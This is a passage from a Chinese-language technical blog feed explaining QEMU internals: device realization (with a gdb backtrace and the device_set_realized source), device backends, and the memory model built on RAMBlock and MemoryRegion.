class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  device_set_realized (obj=0x55555782e5e0, value=true, errp=0x7fffffffd330) at ../../qemu/hw/core/qdev.c:477</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ea3595 in property_set_bool (obj=0x55555782e5e0, v=0x55555782ed80, name=0x5555562f4071 &quot;realized&quot;, opaque=0x5555570ee010, errp=0x7fffffffd330) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea112b in object_property_set (obj=0x55555782e5e0, name=0x5555562f4071 &quot;realized&quot;, v=0x55555782ed80, errp=0x7fffffffd330) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea5d64 in object_property_set_qobject (obj=0x55555782e5e0, name=0x5555562f4071 &quot;realized&quot;, value=0x55555782ecc0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea14e4 in object_property_set_bool (obj=0x55555782e5e0, name=0x5555562f4071 &quot;realized&quot;, value=true, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e974a8 in qdev_realize (dev=0x55555782e5e0, bus=0x55555735b0a0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e974e1 in qdev_realize_and_unref (dev=0x55555782e5e0, bus=0x55555735b0a0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:299</span></span><br><span class="line"><span class="comment">//#7  0x00005555559658fa in sysbus_realize_and_unref (dev=0x55555782e5e0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/sysbus.c:261</span></span><br><span class="line"><span class="comment">//#8  0x0000555555a8dd7c in fw_cfg_init_io_dma (iobase=1296, dma_iobase=1300, dma_as=0x555557047a20 &lt;address_space_memory&gt;) at ../../qemu/hw/nvram/fw_cfg.c:1158</span></span><br><span class="line"><span class="comment">//#9  0x0000555555c9d759 in fw_cfg_arch_create (ms=0x555557352820, boot_cpus=2, apic_id_limit=2) at ../../qemu/hw/i386/fw_cfg.c:118</span></span><br><span class="line"><span class="comment">//#10 0x0000555555ccead1 in pc_memory_init (pcms=0x555557352820, system_memory=0x555557272800, rom_memory=0x555557391400, pci_hole64_size=2147483648) at ../../qemu/hw/i386/pc.c:1024</span></span><br><span class="line"><span class="comment">//#11 0x0000555555cae267 in pc_init1 (machine=0x555557352820, pci_type=0x5555562a5bbb &quot;i440FX&quot;) at ../../qemu/hw/i386/pc_piix.c:226</span></span><br><span class="line"><span class="comment">//#12 0x0000555555caee7d in pc_init_v9_0 (machine=0x555557352820) at ../../qemu/hw/i386/pc_piix.c:523</span></span><br><span class="line"><span class="comment">//#13 0x000055555595e63e in machine_run_board_init (machine=0x555557352820, mem_path=0x0, errp=0x7fffffffd7b0) at ../../qemu/hw/core/machine.c:1547</span></span><br><span class="line"><span class="comment">//#14 0x0000555555bda9d6 in qemu_init_board () at ../../qemu/system/vl.c:2613</span></span><br><span class="line"><span class="comment">//#15 0x0000555555bdace5 in qmp_x_exit_preconfig (errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2705</span></span><br><span class="line"><span class="comment">//#16 0x0000555555bdd6a2 in qemu_init (argc=31, argv=0x7fffffffdae8) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#17 0x0000555555e9282d in main (argc=31, argv=0x7fffffffdae8) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e92809 &lt;main&gt;, argc=argc@entry=31, argv=argv@entry=0x7fffffffdae8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#19 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=31, argv=0x7fffffffdae8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdad8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#20 0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">device_set_realized</span><span class="params">(Object *obj, <span class="type">bool</span> value, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *dev = DEVICE(obj);</span><br><span class="line">    DeviceClass *dc = DEVICE_GET_CLASS(dev);</span><br><span class="line">    HotplugHandler *hotplug_ctrl;</span><br><span class="line">    BusState *bus;</span><br><span class="line">    NamedClockList *ncl;</span><br><span class="line">    Error *local_err = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">bool</span> unattached_parent = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> unattached_count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;hotplugged &amp;&amp; !dc-&gt;hotpluggable) &#123;</span><br><span class="line">        error_setg(errp, QERR_DEVICE_NO_HOTPLUG, object_get_typename(obj));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (value &amp;&amp; !dev-&gt;realized) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!check_only_migratable(obj, errp)) &#123;</span><br><span class="line">            <span class="keyword">goto</span> fail;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!obj-&gt;parent) &#123;</span><br><span class="line">            gchar *name = g_strdup_printf(<span class="string">&quot;device[%d]&quot;</span>, unattached_count++);</span><br><span class="line"></span><br><span class="line">            object_property_add_child(container_get(qdev_get_machine(),</span><br><span class="line">                                                    <span class="string">&quot;/unattached&quot;</span>),</span><br><span class="line">                                      name, obj);</span><br><span class="line">            unattached_parent = <span class="literal">true</span>;</span><br><span class="line">            g_free(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hotplug_ctrl = qdev_get_hotplug_handler(dev);</span><br><span class="line">        <span class="keyword">if</span> (hotplug_ctrl) &#123;</span><br><span class="line">            hotplug_handler_pre_plug(hotplug_ctrl, dev, &amp;local_err);</span><br><span class="line">            <span class="keyword">if</span> (local_err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> fail;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dc-&gt;realize) &#123;</span><br><span class="line">            dc-&gt;realize(dev, &amp;local_err);</span><br><span class="line">            <span class="keyword">if</span> (local_err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> fail;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEVICE_LISTENER_CALL(realize, Forward, dev);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * always free/re-initialize here since the value cannot be cleaned up</span></span><br><span class="line"><span class="comment">         * in device_unrealize due to its usage later on in the unplug path</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        g_free(dev-&gt;canonical_path);</span><br><span class="line">        dev-&gt;canonical_path = object_get_canonical_path(OBJECT(dev));</span><br><span class="line">        QLIST_FOREACH(ncl, &amp;dev-&gt;clocks, node) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ncl-&gt;alias) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                clock_setup_canonical_path(ncl-&gt;clock);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qdev_get_vmsd(dev)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vmstate_register_with_alias_id(VMSTATE_IF(dev),</span><br><span class="line">                                               VMSTATE_INSTANCE_ID_ANY,</span><br><span class="line">                                               qdev_get_vmsd(dev), dev,</span><br><span class="line">                                               dev-&gt;instance_id_alias,</span><br><span class="line">                                               dev-&gt;alias_required_for_version,</span><br><span class="line">                                               &amp;local_err) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> post_realize_fail;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Clear the reset state, in case the object was previously unrealized</span></span><br><span class="line"><span class="comment">         * with a dirty state.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        resettable_state_clear(&amp;dev-&gt;reset);</span><br><span class="line"></span><br><span class="line">        QLIST_FOREACH(bus, &amp;dev-&gt;child_bus, sibling) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!qbus_realize(bus, errp)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> child_realize_fail;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dev-&gt;hotplugged) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Reset the device, as well as its subtree which, at this point,</span></span><br><span class="line"><span class="comment">             * should be realized too.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            resettable_assert_reset(OBJECT(dev), RESET_TYPE_COLD);</span><br><span class="line">            resettable_change_parent(OBJECT(dev), OBJECT(dev-&gt;parent_bus),</span><br><span class="line">                                     <span class="literal">NULL</span>);</span><br><span class="line">            resettable_release_reset(OBJECT(dev), RESET_TYPE_COLD);</span><br><span class="line">        &#125;</span><br><span class="line">        dev-&gt;pending_deleted_event = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hotplug_ctrl) &#123;</span><br><span class="line">            hotplug_handler_plug(hotplug_ctrl, dev, &amp;local_err);</span><br><span class="line">            <span class="keyword">if</span> (local_err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> child_realize_fail;</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       qatomic_store_release(&amp;dev-&gt;realized, value);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!value &amp;&amp; dev-&gt;realized) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Change the value so that any concurrent users are aware</span></span><br><span class="line"><span class="comment">         * that the device is going to be unrealized</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">TODO:</span> change .realized property to enum that states</span></span><br><span class="line"><span class="comment">         * each phase of the device realization/unrealization</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        qatomic_set(&amp;dev-&gt;realized, value);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Ensure that concurrent users see this update prior to</span></span><br><span class="line"><span class="comment">         * any other changes done by unrealize.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        smp_wmb();</span><br><span class="line"></span><br><span class="line">        QLIST_FOREACH(bus, &amp;dev-&gt;child_bus, sibling) &#123;</span><br><span class="line">            qbus_unrealize(bus);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (qdev_get_vmsd(dev)) &#123;</span><br><span class="line">            vmstate_unregister(VMSTATE_IF(dev), qdev_get_vmsd(dev), dev);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dc-&gt;unrealize) &#123;</span><br><span class="line">            dc-&gt;unrealize(dev);</span><br><span class="line">        &#125;</span><br><span class="line">        dev-&gt;pending_deleted_event = <span class="literal">true</span>;</span><br><span class="line">        DEVICE_LISTENER_CALL(unrealize, Reverse, dev);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(local_err == <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">child_realize_fail:</span><br><span class="line">    QLIST_FOREACH(bus, &amp;dev-&gt;child_bus, sibling) &#123;</span><br><span class="line">        qbus_unrealize(bus);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (qdev_get_vmsd(dev)) &#123;</span><br><span class="line">        vmstate_unregister(VMSTATE_IF(dev), qdev_get_vmsd(dev), dev);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">post_realize_fail:</span><br><span class="line">    g_free(dev-&gt;canonical_path);</span><br><span class="line">    dev-&gt;canonical_path = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (dc-&gt;unrealize) &#123;</span><br><span class="line">        dc-&gt;unrealize(dev);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    error_propagate(errp, local_err);</span><br><span class="line">    <span class="keyword">if</span> (unattached_parent) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Beware, this doesn&#x27;t just revert</span></span><br><span class="line"><span class="comment">         * object_property_add_child(), it also runs bus_remove()!</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        object_unparent(OBJECT(dev));</span><br><span class="line">        unattached_count--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，其重点逻辑就是调用类的<strong>realize</strong>/<strong>unrealize</strong>函数指针。</p><h1 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h1><p>在<a href="#前端">前端</a>小节中介绍过，设备后端指的是Qemu如何处理来自设备前端的数据。</p><p>考虑到不同的设备数据处理有不同的特点，因此后端种类十分繁多，这里仅简单罗列一下。</p><div class="table-container"><table><thead><tr><th style="text-align:center">设备类型</th><th style="text-align:center">查找命令</th><th style="text-align:center">设备后端</th></tr></thead><tbody><tr><td style="text-align:center">网络</td><td style="text-align:center">qemu-system-x86_64 -netdev help</td><td style="text-align:center">socket、hubport、tap、user、l2tpv3、bridge、vhost-user、vhost-vdpa</td></tr><tr><td style="text-align:center">存储</td><td style="text-align:center"></td><td style="text-align:center">blockdev</td></tr><tr><td style="text-align:center">字符设备</td><td style="text-align:center">qemu-system-x86_64 -chardev help</td><td style="text-align:center">ringbuf、mux、pipe、qemu-vdagent、null、msmouse、socket、vc、parallel、memory、udp、file、serial、pty、wctablet、stdio、testdev</td></tr><tr><td style="text-align:center">…</td><td style="text-align:center">…</td><td style="text-align:center">…</td></tr></tbody></table></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://qemu-project.gitlab.io/qemu/system/device-emulation.html">Device Emulation</a></li><li><a href="https://wiki.qemu.org/Documentation/Architecture">Documentation/Architecture</a></li><li><a href="https://martins3.github.io/qemu/introduction.html">QEMU 概述</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qemu内存模型</title>
      <link href="/2024/07/20/qemu%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/"/>
      <url>/2024/07/20/qemu%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里简单介绍一些<strong>QEMU</strong>的内存模型，即<strong>QEMU</strong>是如何管理gpa到hva的映射关系。</p><p>其内存模型主要由<strong>RAMBlock</strong>、<strong>MemoryRegion</strong>、<strong>AddressSpace</strong>和<strong>FlatView</strong>等结构构成。</p><h1 id="RAMBlock"><a href="#RAMBlock" class="headerlink" title="RAMBlock"></a>RAMBlock</h1><p>无论如何，Qemu都需要申请一段内存空间用来存放虚拟机内存的真实数据，而这部分内存空间由<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/exec/ramblock.h#L27"><strong>struct RAMBlock</strong></a>来管理。</p><h2 id="struct-RAMBlock"><a href="#struct-RAMBlock" class="headerlink" title="struct RAMBlock"></a>struct RAMBlock</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RAMBlock</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> *<span class="title">mr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> *host;</span><br><span class="line">    <span class="type">uint8_t</span> *colo_cache; <span class="comment">/* For colo, VM&#x27;s ram cache */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> used_length;</span><br><span class="line">    <span class="type">ram_addr_t</span> max_length;</span><br><span class="line">    <span class="type">void</span> (*resized)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">uint64_t</span> length, <span class="type">void</span> *host);</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">/* Protected by the BQL.  */</span></span><br><span class="line">    <span class="type">char</span> idstr[<span class="number">256</span>];</span><br><span class="line">    <span class="comment">/* RCU-enabled, writes protected by the ramlist lock */</span></span><br><span class="line">    QLIST_ENTRY(RAMBlock) next;</span><br><span class="line">    QLIST_HEAD(, RAMBlockNotifier) ramblock_notifiers;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">uint64_t</span> fd_offset;</span><br><span class="line">    <span class="type">size_t</span> page_size;</span><br><span class="line">    <span class="comment">/* dirty bitmap used during migration */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *bmap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Below fields are only used by mapped-ram migration</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* bitmap of pages present in the migration file */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *file_bmap;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * offset in the file pages belonging to this ramblock are saved,</span></span><br><span class="line"><span class="comment">     * used only during migration to a file.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">off_t</span> bitmap_offset;</span><br><span class="line">    <span class="type">uint64_t</span> pages_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bitmap of already received pages in postcopy */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *receivedmap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bitmap to track already cleared dirty bitmap.  When the bit is</span></span><br><span class="line"><span class="comment">     * set, it means the corresponding memory chunk needs a log-clear.</span></span><br><span class="line"><span class="comment">     * Set this up to non-NULL to enable the capability to postpone</span></span><br><span class="line"><span class="comment">     * and split clearing of dirty bitmap on the remote node (e.g.,</span></span><br><span class="line"><span class="comment">     * KVM).  The bitmap will be set only when doing global sync.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * It is only used during src side of ram migration, and it is</span></span><br><span class="line"><span class="comment">     * protected by the global ram_state.bitmap_mutex.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> this bitmap is different comparing to the other bitmaps</span></span><br><span class="line"><span class="comment">     * in that one bit can represent multiple guest pages (which is</span></span><br><span class="line"><span class="comment">     * decided by the `clear_bmap_shift&#x27; variable below).  On</span></span><br><span class="line"><span class="comment">     * destination side, this should always be NULL, and the variable</span></span><br><span class="line"><span class="comment">     * `clear_bmap_shift&#x27; is meaningless.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *clear_bmap;</span><br><span class="line">    <span class="type">uint8_t</span> clear_bmap_shift;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * RAM block length that corresponds to the used_length on the migration</span></span><br><span class="line"><span class="comment">     * source (after RAM block sizes were synchronized). Especially, after</span></span><br><span class="line"><span class="comment">     * starting to run the guest, used_length and postcopy_length can differ.</span></span><br><span class="line"><span class="comment">     * Used to register/unregister uffd handlers and as the size of the received</span></span><br><span class="line"><span class="comment">     * bitmap. Receiving any page beyond this length will bail out, as it</span></span><br><span class="line"><span class="comment">     * could not have been valid on the source.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> postcopy_length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，<strong>host</strong>指向Qemu申请的内存空间的虚拟地址，也就是<strong>hva</strong>。</p><p>而所有的<strong>struct RAMBlock</strong>由<strong>next</strong>指针形成单链表存储在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/physmem.c#L88"><strong>ram_list</strong></a>，如下图所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">         ram_list                 </span><br><span class="line">       ┌───────┬──┐               </span><br><span class="line">       │blocks │  ├────┐          </span><br><span class="line">       └───────┴──┘    │          </span><br><span class="line">                       │          </span><br><span class="line">                       │          </span><br><span class="line">      struct RAMBlock◄─┘          </span><br><span class="line">      ┌─────┬──────┐              </span><br><span class="line">      │idstr│pc.ram│              </span><br><span class="line">      ├─────┼──────┤              </span><br><span class="line">      │next │      ├─────┐        </span><br><span class="line">      └─────┴──────┘     │        </span><br><span class="line">                         │        </span><br><span class="line">      struct RAMBlock◄───┘        </span><br><span class="line">┌─────┬─────────────────────┐     </span><br><span class="line">│idstr│0000:00:02.0/vga.vram│     </span><br><span class="line">├─────┼─────────────────────┤     </span><br><span class="line">│next │                     │     </span><br><span class="line">└─────┴─────────────────────┘     </span><br></pre></td></tr></table></figure><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>Qemu会通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/physmem.c#L2009"><strong>qemu_ram_alloc_internal()</strong></a>来分配和初始化<strong>RAMBlock</strong>数据，关键逻辑如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">RAMBlock *<span class="title function_">qemu_ram_alloc_internal</span><span class="params">(<span class="type">ram_addr_t</span> size, <span class="type">ram_addr_t</span> max_size,</span></span><br><span class="line"><span class="params">                                  <span class="type">void</span> (*resized)(<span class="type">const</span> <span class="type">char</span>*,</span></span><br><span class="line"><span class="params">                                                  <span class="type">uint64_t</span> length,</span></span><br><span class="line"><span class="params">                                                  <span class="type">void</span> *host),</span></span><br><span class="line"><span class="params">                                  <span class="type">void</span> *host, <span class="type">uint32_t</span> ram_flags,</span></span><br><span class="line"><span class="params">                                  MemoryRegion *mr, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    RAMBlock *new_block;</span><br><span class="line">    ...</span><br><span class="line">    new_block = g_malloc0(<span class="keyword">sizeof</span>(*new_block));</span><br><span class="line">    new_block-&gt;host = host;</span><br><span class="line">    ram_block_add(new_block, &amp;local_err);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> new_block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ram_block_add</span><span class="params">(RAMBlock *new_block, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    RAMBlock *block;</span><br><span class="line">    RAMBlock *last_block = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    qemu_mutex_lock_ramlist();</span><br><span class="line">    new_block-&gt;host = qemu_anon_ram_alloc(new_block-&gt;max_length,</span><br><span class="line">                                                  &amp;new_block-&gt;mr-&gt;align,</span><br><span class="line">                                                  shared, noreserve);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Keep the list sorted from biggest to smallest block.  Unlike QTAILQ,</span></span><br><span class="line"><span class="comment">     * QLIST (which has an RCU-friendly variant) does not have insertion at</span></span><br><span class="line"><span class="comment">     * tail, so save the last element in last_block.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RAMBLOCK_FOREACH(block) &#123;</span><br><span class="line">        last_block = block;</span><br><span class="line">        <span class="keyword">if</span> (block-&gt;max_length &lt; new_block-&gt;max_length) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (block) &#123;</span><br><span class="line">        QLIST_INSERT_BEFORE_RCU(block, new_block, next);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (last_block) &#123;</span><br><span class="line">        QLIST_INSERT_AFTER_RCU(last_block, new_block, next);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">/* list is empty */</span></span><br><span class="line">        QLIST_INSERT_HEAD_RCU(&amp;ram_list.blocks, new_block, next);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write list before version */</span></span><br><span class="line">    smp_wmb();</span><br><span class="line">    ram_list.version++;</span><br><span class="line">    qemu_mutex_unlock_ramlist();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其主要就是初始化<strong>RAMBlock</strong>，管理该<strong>RAMBlock</strong>对应的hva，并将其插入<strong>ram_list</strong>中</p><h1 id="MemoryRegion"><a href="#MemoryRegion" class="headerlink" title="MemoryRegion"></a>MemoryRegion</h1><p>实际上，不同区域的gpa有着不同的属性和功能，因此需要分开管理。</p><p>例如，对于如下e1000-mmio的gpa访问，实际上并不是内存的读写，而是对于设备的模拟操作，Qemu需要模拟设备处理guest的请求<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000febc0000-00000000febdffff (prio 1, i/o): e1000-mmio</span><br></pre></td></tr></table></figure></p><p>而对于如下的pc.ram的gpa访问，则只是单纯的内存访问，Qemu只需要简单的存取或读取数据即可<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000-00000000ffffffff (prio 0, ram): pc.ram</span><br></pre></td></tr></table></figure></p><p>为此，Qemu使用<a 